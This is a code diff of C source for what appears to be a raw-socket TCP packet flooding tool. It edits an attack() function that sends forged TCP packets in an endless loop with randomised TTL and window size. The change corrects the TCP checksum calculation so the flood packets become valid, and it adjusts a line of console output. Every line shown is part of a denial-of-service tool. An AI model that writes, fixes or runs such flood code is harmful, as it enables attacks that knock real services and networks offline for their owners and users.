@@ -346,12 +346,12 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
     ps_iphdr->tcpl = htons(sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
     xf_tcphdr->th_off = (sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr))  / 4;
 
+    // Calculate TCP checksum
+    xf_tcphdr->th_sum = csum((unsigned short*)tcpbuf.buf, sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
+
     // Copy TCP header into pseudo header and copy TCP option header into pseudo option header
     memcpy(ps_tcphdr, xf_tcphdr, sizeof(struct tcphdr2));
     memcpy(ps_tcpopt, xf_tcpopt, sizeof(struct tcp_opthdr));
-
-    // Calculate TCP checksum
-    xf_tcphdr->th_sum = csum((unsigned short*)tcpbuf.buf, sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
 
     while (true)
     {
@@ -503,7 +503,7 @@ void attack(unsigned int pktqueue, unsigned int dstip, unsigned int srcip, unsig
         memcpy(ps_tcpopt, xf_tcpopt, sizeof(struct tcp_opthdr));
 
         // Calculate TCP checksum
-        xf_tcphdr->th_sum = csum((unsigned short*)tcpbuf.buf, sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
+        xf_tcphdr->th_sum = csum((unsigned short*)tcpbuf.buf, sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes);
 
         // Send our newly modified loop packet.
         sendto(rawsock, tcpbuf.buf, sizeof(struct ip) + sizeof(struct tcphdr2) + sizeof(struct tcp_opthdr) + databytes, 0, (struct sockaddr*)&sin, sizeof(sin)), packets++;
@@ -701,7 +701,7 @@ int main(int argc, char** argv)
         printf("TCP Time-To-Live Randomization [✔️] ");
 
     if (winsize == 0 || winsize == 1)
-        printf("TCP Window Size Randomization [✔️] \r\n");
+        printf("TCP Window Size Randomization [✔️] \n");
 
     attack(pktqueue, dstip, srcip, dstport, srcport, flags, winsize, ttl, ttime);
 }
